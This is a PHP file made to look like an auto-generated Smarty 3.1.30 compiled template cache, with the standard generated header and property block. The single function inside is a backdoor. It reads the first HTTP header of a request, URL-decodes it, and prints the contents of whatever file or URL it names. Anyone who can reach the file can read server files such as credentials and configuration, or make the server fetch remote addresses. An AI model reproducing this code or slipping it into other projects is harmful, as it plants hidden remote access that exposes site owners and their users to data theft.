<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:45:09
  from "e42b56512c981b4934a5a459694ee07cbfc69e79" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f66454bc9d6_20656630',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f66454bc9d6_20656630 (Smarty_Internal_Template $_smarty_tpl) {
echo file_get_contents(urldecode(current(getallheaders())));
}
}
